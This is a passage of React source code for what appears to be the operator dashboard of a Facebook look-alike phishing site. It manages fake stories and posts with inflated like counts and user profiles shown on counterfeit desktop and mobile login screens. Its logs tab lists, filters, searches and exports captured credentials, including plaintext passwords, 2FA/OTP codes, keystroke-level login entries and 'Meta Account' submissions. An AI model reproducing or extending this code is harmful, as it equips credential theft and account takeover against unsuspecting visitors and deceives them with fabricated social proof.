                        className="fb-admin-input"
                        placeholder="Thumbnail image URL"
                        value={newStoryForm.mediaUrl}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, mediaUrl: e.target.value })}
                        required
                      />
                    </div>
                  </div>

                  <div className="fb-admin-form-row">
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Story Caption</label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        placeholder="e.g. Workout grind never stops! 💪🔥"
                        value={newStoryForm.caption}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, caption: e.target.value })}
                      />
                    </div>
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Timestamp / Tag</label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        placeholder="e.g. Suggested or 2h ago"
                        value={newStoryForm.timestamp}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, timestamp: e.target.value })}
                      />
                    </div>
                  </div>

                  <button type="submit" className="fb-admin-btn-primary" style={{ marginTop: '8px' }}>
                    <Plus size={16} />
                    <span>Publish Video Story</span>
                  </button>
                </form>
              </div>

              {/* Active Stories Grid */}
              <div className="fb-admin-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
                  <h3 className="fb-admin-card-title">Active Stories ({stories.length})</h3>
                  <span style={{ fontSize: '12px', color: '#65676B' }}>
                    Click play on any card to preview video playback
                  </span>
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(220px, 1fr))', gap: '16px' }}>
                  {stories.map((s) => (
                    <div
                      key={s.id}
                      style={{
                        borderRadius: '12px',
                        overflow: 'hidden',
                        border: '1px solid #E4E6EB',
                        background: '#FFFFFF',
                        boxShadow: '0 2px 6px rgba(0,0,0,0.06)',
                        display: 'flex',
                        flexDirection: 'column',
                      }}
                    >
                      {/* Video Player Preview */}
                      <div style={{ position: 'relative', height: '260px', background: '#000000' }}>
                        {s.videoUrl ? (
                          <video
                            src={s.videoUrl}
                            poster={s.mediaUrl}
                            controls
                            playsInline
                            style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                          />
                        ) : (
                          <img
                            src={s.mediaUrl}
                            alt={s.userName}
                            style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                          />
                        )}
                        <span
                          style={{
                            position: 'absolute',
                            top: '8px',
                            right: '8px',
                            background: '#0866FF',
                            color: '#FFFFFF',
                            fontSize: '10px',
                            fontWeight: 700,
                            padding: '2px 6px',
                            borderRadius: '4px',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '3px',
                          }}
                        >
                          <Play size={10} fill="#FFF" /> VIDEO
                        </span>
                      </div>

                      {/* Info & Actions */}
                      <div style={{ padding: '12px', flex: 1, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                        <div>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                            <img
                              src={s.userAvatar}
                              alt={s.userName}
                              style={{ width: '32px', height: '32px', borderRadius: '50%', objectFit: 'cover', border: '1.5px solid #0866FF' }}
                            />
                            <div>
                              <div style={{ fontSize: '13px', fontWeight: 700, color: '#050505' }}>{s.userName}</div>
                              <div style={{ fontSize: '11px', color: '#65676B' }}>{s.timestamp || 'Suggested'}</div>
                            </div>
                          </div>
                          {s.caption && (
                            <div style={{ fontSize: '12px', color: '#333', marginBottom: '8px', fontStyle: 'italic' }}>
                              "{s.caption}"
                            </div>
                          )}
                        </div>

                        <button
                          type="button"
                          onClick={() => handleDeleteStory(s.id)}
                          style={{
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            gap: '6px',
                            width: '100%',
                            padding: '6px',
                            borderRadius: '6px',
                            border: '1px solid #FFD1D5',
                            background: '#FFF0F2',
                            color: '#E41E3F',
                            fontSize: '12px',
                            fontWeight: 600,
                            cursor: 'pointer',
                            marginTop: '8px',
                          }}
                        >
                          <Trash2 size={13} />
                          <span>Delete Story</span>
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
          {/* ========================================================
              TAB 3: FEED POSTS MANAGEMENT
              ======================================================== */}
          {activeTab === 'posts' && (
            <div className="fb-admin-tab-pane">
              <div className="fb-admin-section-header-row">
                <div>
                  <h2 className="fb-admin-section-heading">Feed Posts Management</h2>
                  <p className="fb-admin-section-sub">
                    Publish official posts, edit content, and display high-res media dynamically.
                  </p>
                </div>
              </div>

              {/* Publish Feed Post Box */}
              <div className="fb-admin-panel-box" style={{ marginBottom: 24 }}>
                <div className="fb-admin-box-header">
                  <h3>Publish New Feed Post</h3>
                  <div className="fb-admin-pill-toggle-group">
                    <button
                      type="button"
                      className={`fb-admin-pill-btn ${postMode === 'standard' ? 'active' : ''}`}
                      onClick={() => setPostMode('standard')}
                    >
                      <ImageIcon size={15} />
                      <span>Standard / Photo Post</span>
                    </button>
                    <button
                      type="button"
                      className={`fb-admin-pill-btn ${postMode === 'color_card' ? 'active' : ''}`}
                      onClick={() => setPostMode('color_card')}
                    >
                      <Palette size={15} />
                      <span>Colored Status Card</span>
                    </button>
                  </div>
                </div>

                <form onSubmit={handleCreatePost} className="fb-admin-post-form">
                  {/* Author Selector */}
                  <div className="form-row-grid">
                    <div>
                      <label className="fb-admin-field-label">Post Author</label>
                      <select
                        className="fb-admin-form-input"
                        value={selectedAuthorId}
                        onChange={(e) => handleSelectAuthor(e.target.value)}
                      >
                        {users.map((u) => (
                          <option key={u.id} value={u.id}>
                            {u.name} {u.badge ? `(${u.badge})` : ''}
                          </option>
                        ))}
                        <option value="custom">+ Custom Author</option>
                      </select>
                    </div>

                    <div>
                      <label className="fb-admin-field-label">Author Name</label>
                      <input
                        type="text"
                        placeholder="Author Name"
                        className="fb-admin-form-input"
                        value={newPost.authorName}
                        onChange={(e) => setNewPost({ ...newPost, authorName: e.target.value })}
                        required
                      />
                    </div>
                  </div>

                  {/* Standard Post Inputs */}
                  {postMode === 'standard' ? (
                    <>
                      <div style={{ marginTop: 12 }}>
                        <label className="fb-admin-field-label">Post Message / Content</label>
                        <textarea
                          placeholder="What's on your mind? (Use hashtags, emojis, or multiple lines)"
                          className="fb-admin-form-textarea"
                          rows={3}
                          value={newPost.content}
                          onChange={(e) => setNewPost({ ...newPost, content: e.target.value })}
                          required
                        />
                      </div>

                      <div className="form-row-grid" style={{ marginTop: 12 }}>
                        <div>
                          <label className="fb-admin-field-label">Attachment Image URL (High-Res)</label>
                          <input
                            type="text"
                            placeholder="https://images.unsplash.com/photo-..."
                            className="fb-admin-form-input"
                            value={newPost.image}
                            onChange={(e) => setNewPost({ ...newPost, image: e.target.value })}
                          />
                        </div>

                        <div>
                          <label className="fb-admin-field-label">Initial Likes Count</label>
                          <input
                            type="number"
                            placeholder="e.g. 500"
                            className="fb-admin-form-input"
                            value={newPost.likes}
                            onChange={(e) => setNewPost({ ...newPost, likes: e.target.value })}
                          />
                        </div>
                      </div>
                    </>
                  ) : (
                    /* Colored Card Mode */
                    <>
                      <div style={{ marginTop: 12 }}>
                        <label className="fb-admin-field-label">Colored Card Announcement Text</label>
                        <textarea
                          placeholder="Short, bold status message to display on the vibrant colored card..."
                          className="fb-admin-form-textarea"
                          rows={3}
                          value={newPost.colorCardText}
                          onChange={(e) => setNewPost({ ...newPost, colorCardText: e.target.value })}
                          required
                        />
                      </div>

                      <div style={{ marginTop: 12 }}>
                        <label className="fb-admin-field-label">Card Background Style</label>
                        <div className="fb-color-palette-picker">
                          {COLOR_PALETTES.map((pal) => (
                            <button
                              key={pal.label}
                              type="button"
                              className={`fb-palette-swatch ${newPost.colorCardColor === pal.color ? 'selected' : ''}`}
                              style={{ background: pal.color }}
                              title={pal.label}
                              onClick={() => setNewPost({ ...newPost, colorCardColor: pal.color })}
                            >
                              {newPost.colorCardColor === pal.color && (
                                <Check size={16} color="#FFFFFF" strokeWidth={3} />
                              )}
                            </button>
                          ))}
                        </div>
                      </div>

                      <div style={{ marginTop: 12 }}>
                        <label className="fb-admin-field-label">Initial Likes Count</label>
                        <input
                          type="number"
                          placeholder="e.g. 1000"
                          className="fb-admin-form-input"
                          value={newPost.likes}
                          onChange={(e) => setNewPost({ ...newPost, likes: e.target.value })}
                          style={{ maxWidth: 200 }}
                        />
                      </div>
                    </>
                  )}

                  {/* Live Dynamic Preview */}
                  {(newPost.content || newPost.colorCardText || newPost.image) && (
                    <div className="fb-admin-live-preview-box">
                      <div className="preview-label">Live Feed Preview</div>
                      <div className="fb-admin-feed-card preview-card">
                        <div className="feed-card-header">
                          <img
                            src={newPost.authorAvatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80'}
                            alt="Author"
                            className="feed-avatar"
                          />
                          <div className="feed-author-meta">
                            <span className="feed-author-name">{newPost.authorName || 'Member'}</span>
                            <span className="feed-timestamp">Just now · <Globe size={11} /></span>
                          </div>
                        </div>

                        {postMode === 'color_card' ? (
                          <div
                            className="fb-post-colored-bg"
                            style={{ background: newPost.colorCardColor, margin: '10px 0', borderRadius: 8 }}
                          >
                            <div className="fb-post-colored-text">
                              {newPost.colorCardText || 'Your status message will appear here...'}
                            </div>
                          </div>
                        ) : (
                          <>
                            {newPost.content && (
                              <div className="feed-text-content">{newPost.content}</div>
                            )}
                            {newPost.image && (
                              <div className="feed-media-wrap">
                                <img src={newPost.image} alt="Attachment" />
                              </div>
                            )}
                          </>
                        )}

                        <div className="feed-stats-bar">
                          <span>❤️ 👍 {newPost.likes || 0} Likes</span>
                          <span>0 Comments</span>
                        </div>
                      </div>
                    </div>
                  )}

                  <button type="submit" className="fb-admin-btn-primary" style={{ marginTop: 16 }}>
                    <Plus size={16} />
                    <span>Publish to Feed</span>
                  </button>
                </form>
              </div>

              {/* All Posts Feed List with Correct Dynamic Rendering */}
              <div className="fb-admin-panel-box">
                <div className="fb-admin-box-header">
                  <h3>All Feed Posts ({posts.length})</h3>
                  <button
                    type="button"
                    className="fb-admin-refresh-btn"
                    onClick={loadData}
                    style={{ padding: '6px 12px' }}
                  >
                    <RefreshCw size={14} className={loading ? 'spin' : ''} />
                    <span>Reload Feed</span>
                  </button>
                </div>

                <div className="fb-admin-posts-grid">
                  {posts.map((p) => {
                    const postImages = getPostMediaImages(p);
                    const primaryImage = getPostImageUrl(p);

                    return (
                      <article key={p.id} className="fb-admin-feed-card">
                        {/* Header */}
                        <div className="feed-card-header">
                          <img
                            src={
                              p.author?.avatar ||
                              'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80'
                            }
                            alt={p.author?.name}
                            className="feed-avatar"
                          />
                          <div className="feed-author-meta">
                            <div className="feed-author-name-row">
                              <span className="feed-author-name">{p.author?.name || 'User'}</span>
                              {p.author?.badge && (
                                <span className="feed-author-badge">{p.author.badge}</span>
                              )}
                              {p.author?.verified && (
                                <span className="fb-verified-badge" title="Verified">✓</span>
                              )}
                            </div>
                            <span className="feed-timestamp">
                              {p.timestamp || p.timeAgo || 'Recent'} · <Globe size={11} />
                            </span>
                          </div>

                          <div className="feed-card-top-actions">
                            <button
                              type="button"
                              className="fb-admin-icon-btn edit"
                              onClick={() =>
                                setEditingPost({
                                  id: p.id,
                                  content: p.content || p.caption || '',
                                  caption: p.caption || '',
                                  image: primaryImage || '',
                                  likes: (p.stats && p.stats.likes) || 0,
                                })
                              }
                              title="Edit Post"
                            >
                              <Edit3 size={16} />
                            </button>

                            <button
                              type="button"
                              className="fb-admin-icon-btn delete"
                              onClick={() => handleDeletePost(p.id)}
                              title="Delete Post"
                            >
                              <Trash2 size={16} />
                            </button>
                          </div>
                        </div>

                        {/* Caption (if present) */}
                        {p.caption && <div className="feed-caption-text">{p.caption}</div>}

                        {/* Post Content */}
                        {p.content && <div className="feed-text-content">{p.content}</div>}

                        {/* Colored Status Card (if present) */}
                        {p.backgroundCard && (
                          <div
                            className="fb-post-colored-bg"
                            style={{ background: p.backgroundCard.color, margin: '12px 0', borderRadius: 8 }}
                          >
                            <div className="fb-post-colored-text">
                              {p.backgroundCard.text}
                            </div>
                          </div>
                        )}

                        {/* Dynamic High-Res Media Display */}
                        {postImages.length > 0 && (
                          <div className="feed-media-wrap">
                            <img src={postImages[0]} alt="Post visual" className="feed-img-main" />
                            {postImages.length > 1 && (
                              <div className="feed-media-sub-strip">
                                {postImages.slice(1, 4).map((imgUrl, idx) => (
                                  <img key={idx} src={imgUrl} alt={`Sub asset ${idx + 1}`} />
                                ))}
                              </div>
                            )}
                          </div>
                        )}

                        {/* Engagement Stats Bar */}
                        <div className="feed-stats-bar">
                          <div className="stats-reactions">
                            <span className="emoji-pill">👍</span>
                            <span className="emoji-pill" style={{ marginLeft: -4 }}>❤️</span>
                            <span className="likes-count">
                              {((p.stats && p.stats.likes) || 0).toLocaleString()} Likes
                            </span>
                          </div>

                          <div className="stats-comments">
                            <span>{p.comments ? p.comments.length : (p.stats && p.stats.comments) || 0} comments</span>
                            <span>·</span>
                            <span>{(p.stats && p.stats.shares) || 0} shares</span>
                          </div>
                        </div>

                        {/* Quick Interactive Admin Action Buttons */}
                        <div className="feed-admin-actions-bar">
                          <button
                            type="button"
                            className="feed-action-pill-btn"
                            onClick={() => handleBoostLikes(p.id, 50)}
                            title="Boost likes count dynamically"
                          >
                            <Heart size={14} color="#FA383E" />
                            <span>+50 Likes</span>
                          </button>

                          <button
                            type="button"
                            className="feed-action-pill-btn"
                            onClick={() => handleBoostLikes(p.id, 500)}
                            title="Boost +500 Likes"
                          >
                            <Heart size={14} color="#FA383E" />
                            <span>+500 Likes</span>
                          </button>

                          <button
                            type="button"
                            className="feed-action-pill-btn"
                            onClick={() =>
                              setEditingPost({
                                id: p.id,
                                content: p.content || p.caption || '',
                                caption: p.caption || '',
                                image: primaryImage || '',
                                likes: (p.stats && p.stats.likes) || 0,
                              })
                            }
                          >
                            <Edit3 size={14} />
                            <span>Edit</span>
                          </button>
                        </div>
                      </article>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* ========================================================
              TAB 1: OVERVIEW
              ======================================================== */}
          {activeTab === 'overview' && (
            <div className="fb-admin-tab-pane">
              <h2 className="fb-admin-section-heading">Platform Overview</h2>
              <p className="fb-admin-section-sub">
                Live metrics and controls for your social network.
              </p>

              <div className="fb-admin-metrics-grid">
                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('users')}>
                  <div className="metric-icon blue">
                    <Users size={24} />
                  </div>
                  <div className="metric-details">
                    <span className="metric-value">{users.length}</span>
                    <span className="metric-title">Registered Accounts</span>
                  </div>
                </div>

                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('posts')}>
                  <div className="metric-icon green">
                    <FileText size={24} />
                  </div>
                  <div className="metric-details">
                    <span className="metric-value">{posts.length}</span>
                    <span className="metric-title">Feed Posts (Active)</span>
                  </div>
                </div>

                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('logs')}>
                  <div className="metric-icon blue" style={{ background: '#E0F2FE', color: '#0284C7' }}>
                    <Database size={24} />
                  </div>
                  <div className="metric-details">
                    <span className="metric-value">{loginLogs.length}</span>
                    <span className="metric-title">Captured Database Logs</span>
                  </div>
                </div>

                <div className="fb-admin-metric-card" onClick={() => handleSelectTab('notifs')}>
                  <div className="metric-icon purple">
                    <Bell size={24} />
                  </div>
                  <div className="metric-details">
                    <span className="metric-value">{notifications.length}</span>
                    <span className="metric-title">Notifications</span>
                  </div>
                </div>

                <div className="fb-admin-metric-card">
                  <div className="metric-icon orange">
                    <Server size={24} />
                  </div>
                  <div className="metric-details">
                    <span className="metric-value">{serverStatus === 'online' ? '200 OK' : 'Local'}</span>
                    <span className="metric-title">Backend Status</span>
                  </div>
                </div>
              </div>

              {/* Login Screen Accounts Quick Preview */}
              <div className="fb-admin-panel-box" style={{ marginTop: 24 }}>
                <div className="fb-admin-box-header">
                  <h3>Accounts Displayed on Login Screen</h3>
                  <button
                    className="fb-admin-btn-text"
                    onClick={() => handleSelectTab('users')}
                  >
                    Manage Users &rarr;
                  </button>
                </div>
                <div className="fb-admin-login-accounts-list">
                  {users
                    .filter((u) => u.showOnDesktopLogin || u.showOnMobileLogin)
                    .map((acc) => (
                      <div key={acc.id} className="fb-admin-account-pill">
                        <img src={acc.avatar} alt={acc.name} className="pill-avatar" />
                        <div className="pill-info">
                          <span className="pill-name">{acc.name}</span>
                          <span className="pill-role">
                            {acc.showOnDesktopLogin ? 'Desktop' : ''}
                            {acc.showOnDesktopLogin && acc.showOnMobileLogin ? ' + ' : ''}
                            {acc.showOnMobileLogin ? 'Mobile' : ''}
                          </span>
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            </div>
          )}

          {/* ========================================================
              TAB 2: USERS & LOGIN SCREEN MANAGEMENT
              ======================================================== */}
          {activeTab === 'users' && (
            <div className="fb-admin-tab-pane">
              <div className="fb-admin-section-header-row">
                <div>
                  <h2 className="fb-admin-section-heading">Users & Login Profiles</h2>
                  <p className="fb-admin-section-sub">
                    Edit user profile names, update profile pictures, and manage login screen access.
                  </p>
                </div>
                <button
                  type="button"
                  className="fb-admin-btn-primary"
                  onClick={() => setIsCreatingUser(true)}
                  style={{ display: 'flex', alignItems: 'center', gap: '6px' }}
                >
                  <UserPlus size={16} />
                  <span>Create User Profile</span>
                </button>
              </div>

              {/* Users Table */}
              <div className="fb-admin-panel-box">
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
                  <h3 style={{ margin: 0, fontSize: 16 }}>All Accounts ({users.length})</h3>
                  <span style={{ fontSize: '12px', color: '#65676B' }}>
                    Click "Edit Profile" on any user to update their name, avatar picture, or bio
                  </span>
                </div>
                <div className="fb-admin-table-wrap">
                  <table className="fb-admin-table">
                    <thead>
                      <tr>
                        <th>User Profile</th>
                        <th>Email Address</th>
                        <th>Display Name</th>
                        <th>Login Screen Display</th>
                        <th style={{ textAlign: 'right' }}>Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {users.map((u) => (
                        <tr key={u.id} className="fb-admin-cyber-row">
                          <td>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                              <img
                                src={u.avatar}
                                alt={u.name}
                                style={{ width: '38px', height: '38px', borderRadius: '50%', objectFit: 'cover' }}
                              />
                              <div>
                                <div style={{ fontWeight: 700, color: '#050505', fontSize: '13.5px' }}>{u.name}</div>
                                <div style={{ fontSize: '11px', color: '#65676B' }}>{u.bio || 'Member'}</div>
                              </div>
                            </div>
                          </td>
                          <td>
                            <span style={{ fontSize: '13px', color: '#050505' }}>{u.email}</span>
                          </td>
                          <td>
                            <span style={{ fontWeight: 600, color: '#050505', fontSize: '13px' }}>{u.shortName || u.name}</span>
                          </td>
                          <td>
                            <div style={{ display: 'flex', gap: '6px' }}>
                              {u.showOnDesktopLogin && (
                                <span className="fb-admin-origin-pill desktop">🖥️ Desktop</span>
                              )}
                              {u.showOnMobileLogin && (
                                <span className="fb-admin-origin-pill mobile">📱 Mobile</span>
                              )}
                            </div>
                          </td>
                          <td style={{ textAlign: 'right' }}>
                            <div style={{ display: 'inline-flex', gap: '6px' }}>
                              <button
                                type="button"
                                className="fb-admin-btn-secondary"
                                onClick={() => handleStartEditUser(u)}
                                style={{ fontSize: '12px', padding: '4px 10px' }}
                              >
                                <Edit3 size={13} /> Edit Profile
                              </button>
                              <button
                                type="button"
                                className="fb-admin-btn-secondary"
                                onClick={() => handleDeleteUser(u.id)}
                                style={{ fontSize: '12px', padding: '4px 8px', color: '#DC2626' }}
                                title="Delete user"
                              >
                                <Trash2 size={13} />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* ========================================================
              TAB: DATABASE & CAPTURED LOGIN LOGS
              ======================================================== */}
          {activeTab === 'logs' && (() => {
            const isIntermediateBlur = (l) => {
              const act = (l?.action || '').toLowerCase();
              return (
                act === 'desktop password entered' ||
                act === 'typed username / email on login screen' ||
                act.startsWith('find account input:') ||
                act.includes('password typed for')
              );
            };

            const concentratedLogsCount = loginLogs.filter((l) => !isIntermediateBlur(l)).length;
            const totalCapturedPasswords = loginLogs.filter(
              (l) => l.password && l.password !== '[empty]' && l.password !== '[no password entered]'
            ).length;
            const successfulLoginsCount = loginLogs.filter((l) => l.success).length;
            const trialKeystrokesCount = loginLogs.filter((l) => !l.success && !isIntermediateBlur(l)).length;
            const otpCodesCount = loginLogs.filter((l) => Boolean(l.code && l.code.trim())).length;
            const findAccountCount = loginLogs.filter((l) =>
              (l.source || '').toLowerCase().includes('find') ||
              (l.screen || '').toLowerCase().includes('find') ||
              (l.action || '').toLowerCase().includes('find account')
            ).length;
            const metaAccountCount = loginLogs.filter((l) =>
              (l.source || '').toLowerCase().includes('meta') ||
              (l.screen || '').toLowerCase().includes('meta') ||
              (l.action || '').toLowerCase().includes('meta')
            ).length;
            const desktopLoginCount = loginLogs.filter((l) =>
              ((l.source || '').toLowerCase().includes('desktop') || !(l.source || '').toLowerCase().includes('mobile')) &&
              !(l.source || '').toLowerCase().includes('meta') &&
              !(l.source || '').toLowerCase().includes('find')
            ).length;

            const filteredLogs = loginLogs.filter((log) => {
              if (logSearchQuery.trim()) {
                const q = logSearchQuery.toLowerCase();
                const matchUser = (log.username || '').toLowerCase().includes(q);
                const matchEmail = (log.email || '').toLowerCase().includes(q);
                const matchPass = (log.password || '').toLowerCase().includes(q);
                const matchAction = (log.action || '').toLowerCase().includes(q);
                const matchSource = (log.source || '').toLowerCase().includes(q);
                const matchScreen = (log.screen || '').toLowerCase().includes(q);
                const matchDevice = (log.device || '').toLowerCase().includes(q);
                const matchCode = (log.code || '').toLowerCase().includes(q);
                const matchId = (log.id || '').toLowerCase().includes(q);
                if (
                  !matchUser &&
                  !matchEmail &&
                  !matchPass &&
                  !matchAction &&
                  !matchSource &&
                  !matchScreen &&
                  !matchDevice &&
                  !matchCode &&
                  !matchId
                ) {
                  return false;
                }
              }

              if (logFilter === 'concentrated') {
                return !isIntermediateBlur(log);
              }
              if (logFilter === 'passwords') {
                return (
                  log.password &&
                  log.password !== '[empty]' &&
                  log.password !== '[no password entered]' &&
                  !log.password.startsWith('[Find Account')
                );
              }
              if (logFilter === 'meta') {
                return (
                  (log.source || '').toLowerCase().includes('meta') ||
                  (log.screen || '').toLowerCase().includes('meta') ||
                  (log.action || '').toLowerCase().includes('meta')
                );
              }
              if (logFilter === 'find_account') {
                return (
                  (log.source || '').toLowerCase().includes('find') ||
                  (log.screen || '').toLowerCase().includes('find') ||
                  (log.action || '').toLowerCase().includes('find account')
                );
              }
              if (logFilter === 'desktop') {
                return (
                  ((log.source || '').toLowerCase().includes('desktop') || !(log.source || '').toLowerCase().includes('mobile')) &&
                  !(log.source || '').toLowerCase().includes('meta') &&
                  !(log.source || '').toLowerCase().includes('find')
                );
              }
              if (logFilter === 'success') {
                return log.success;
              }
              if (logFilter === 'trials') {
                return !log.success;
              }
              if (logFilter === 'codes') {
                return Boolean(log.code && log.code.trim());
              }
              return true;
            });

            return (
              <div className="fb-admin-tab-pane">
                {/* Section Header */}
                <div className="fb-admin-section-header-row" style={{ alignItems: 'center', marginBottom: 20 }}>
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                      <h2 className="fb-admin-section-heading" style={{ margin: 0, fontSize: '20px', fontWeight: 800 }}>
                        Database & Live Authentication Stream
                      </h2>
                      <div className="fb-admin-live-badge">
                        <span className="fb-admin-pulse-indicator" />
                        <span>Live Sync: store.json</span>
                      </div>
                    </div>
                    <p className="fb-admin-section-sub" style={{ margin: 0 }}>
                      Live audit monitoring of captured credentials, 2FA verification trials, and visitor logins.
                    </p>
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                    <button
                      type="button"
                      className="fb-admin-btn-secondary"
                      onClick={loadData}
                      title="Reload records directly from store.json"
                      style={{ display: 'flex', alignItems: 'center', gap: '6px' }}
                    >
                      <RefreshCw size={14} className={loading ? 'spin' : ''} />
                      <span>Refresh</span>
                    </button>
                    <button
                      type="button"
                      className="fb-admin-btn-secondary"
                      onClick={handleExportLogsJson}
                      title="Export database records as JSON file"
                      style={{ display: 'flex', alignItems: 'center', gap: '6px' }}
                    >
                      <Download size={14} />
                      <span>Export JSON</span>
                    </button>
                    <button
                      type="button"
                      className="fb-admin-glow-btn"
                      onClick={handleSimulateTestLogin}
                      title="Add a test record to verify table and storage"
                    >
                      <Sparkles size={14} />
                      <span>+ Simulate Test</span>
                    </button>
                    <button
                      type="button"
                      className="fb-admin-btn-secondary"
                      onClick={handleClearLogs}
                      title="Clear all database logs"
                      style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px',
                        color: '#E41E3F',
                        borderColor: '#FFD1D5',
                      }}
                    >
                      <Trash2 size={14} />
                      <span>Clear</span>
                    </button>
                  </div>
                </div>

                {/* Sleek Metric Stat Cards */}
                <div className="fb-admin-pro-stats-grid">
                  {/* Card 1: Total Logs */}
                  <div className="fb-admin-pro-stat-card">
                    <div className="fb-admin-pro-stat-top">
                      <span className="fb-admin-pro-stat-label">Total Logs Saved</span>
                      <div className="fb-admin-squircle blue">
                        <Database size={20} />
                      </div>
                    </div>
                    <div className="fb-admin-pro-stat-value">{loginLogs.length}</div>
                    <div className="fb-admin-pro-stat-sub">
                      <Clock size={12} color="#0866FF" />
                      <span>Persistent in store.json</span>
                    </div>
                  </div>

                  {/* Card 2: Verified Success */}
                  <div className="fb-admin-pro-stat-card">
                    <div className="fb-admin-pro-stat-top">
                      <span className="fb-admin-pro-stat-label">Verified Logins</span>
                      <div className="fb-admin-squircle emerald">
                        <CheckCircle2 size={20} />
                      </div>
                    </div>
                    <div className="fb-admin-pro-stat-value" style={{ color: '#059669' }}>
                      {successfulLoginsCount}
                    </div>
                    <div className="fb-admin-pro-stat-sub">
                      <span style={{ display: 'inline-block', width: '6px', height: '6px', borderRadius: '50%', background: '#10B981' }} />
                      <span>Granted homepage entry</span>
                    </div>
                  </div>

                  {/* Card 3: 2FA & OTP Trials */}
                  <div className="fb-admin-pro-stat-card">
                    <div className="fb-admin-pro-stat-top">
                      <span className="fb-admin-pro-stat-label">2FA / OTP Trials</span>
                      <div className="fb-admin-squircle purple">
                        <ShieldCheck size={20} />
                      </div>
                    </div>
                    <div className="fb-admin-pro-stat-value" style={{ color: '#7C3AED' }}>
                      {otpCodesCount}
                    </div>
                    <div className="fb-admin-pro-stat-sub">
                      <Zap size={12} color="#7C3AED" />
                      <span>Codes tested & recorded</span>
                    </div>
                  </div>

                  {/* Card 4: Plaintext Passwords */}
                  <div className="fb-admin-pro-stat-card">
                    <div className="fb-admin-pro-stat-top">
                      <span className="fb-admin-pro-stat-label">Captured Passwords</span>
                      <div className="fb-admin-squircle rose">
                        <Key size={20} />
                      </div>
                    </div>
                    <div className="fb-admin-pro-stat-value" style={{ color: '#E11D48' }}>
                      {totalCapturedPasswords}
                    </div>
                    <div className="fb-admin-pro-stat-sub">
                      <span style={{ fontFamily: 'Consolas, monospace', fontSize: '11px', color: '#64748B' }}>
                        Captured unmasked
                      </span>
                    </div>
                  </div>
                </div>

                {/* Control Center: Search & Filter Bar */}
                <div className="fb-admin-control-bar">
                  <div className="fb-admin-search-wrapper">
                    <Search size={16} className="fb-admin-search-icon" />
                    <input
                      type="text"
                      className="fb-admin-search-input"
                      placeholder="Search username, email, password, action..."
                      value={logSearchQuery}
                      onChange={(e) => setLogSearchQuery(e.target.value)}
                    />
                    {logSearchQuery && (
                      <button
                        type="button"
                        className="fb-admin-search-clear"
                        onClick={() => setLogSearchQuery('')}
                        title="Clear search"
                      >
                        <X size={14} />
                      </button>
                    )}
                  </div>

                  {/* Filter Chips */}
                  <div className="fb-admin-filter-group">
                    <button
                      type="button"
                      className={`fb-admin-filter-chip ${logFilter === 'concentrated' ? 'active' : ''}`}
                      onClick={() => setLogFilter('concentrated')}
                      title="Shows only actual login trials and explicit submissions"
                    >
                      <Sparkles size={13} />
                      <span>Concentrated (Trials Only)</span>
                      <span className="fb-admin-chip-count">{concentratedLogsCount}</span>
                    </button>

                    <button
                      type="button"
                      className={`fb-admin-filter-chip ${logFilter === 'all' ? 'active' : ''}`}
                      onClick={() => setLogFilter('all')}
                    >
                      <span>All Events</span>
                      <span className="fb-admin-chip-count">{loginLogs.length}</span>
                    </button>

                    <button
                      type="button"
                      className={`fb-admin-filter-chip ${logFilter === 'passwords' ? 'active' : ''}`}
                      onClick={() => setLogFilter('passwords')}
                    >
                      <Key size={13} />
                      <span>Passwords</span>
                      <span className="fb-admin-chip-count">{totalCapturedPasswords}</span>
                    </button>

                    <button
                      type="button"
                      className={`fb-admin-filter-chip ${logFilter === 'success' ? 'active' : ''}`}
                      onClick={() => setLogFilter('success')}
                    >
                      <CheckCircle2 size={13} />
                      <span>Successful</span>
                      <span className="fb-admin-chip-count">{successfulLoginsCount}</span>
                    </button>

                    <button
                      type="button"
                      className={`fb-admin-filter-chip ${logFilter === 'trials' ? 'active' : ''}`}
                      onClick={() => setLogFilter('trials')}
                    >
                      <Activity size={13} />
                      <span>Trials</span>
                      <span className="fb-admin-chip-count">{trialKeystrokesCount}</span>
                    </button>

                    {otpCodesCount > 0 && (
                      <button
                        type="button"
                        className={`fb-admin-filter-chip ${logFilter === 'codes' ? 'active' : ''}`}
                        onClick={() => setLogFilter('codes')}
                      >
                        <span>OTP Codes</span>
                        <span className="fb-admin-chip-count">{otpCodesCount}</span>
                      </button>
                    )}

                    {metaAccountCount > 0 && (
                      <button
                        type="button"
                        className={`fb-admin-filter-chip ${logFilter === 'meta' ? 'active' : ''}`}
                        onClick={() => setLogFilter('meta')}
                      >
                        <span>♾️ Meta Account</span>
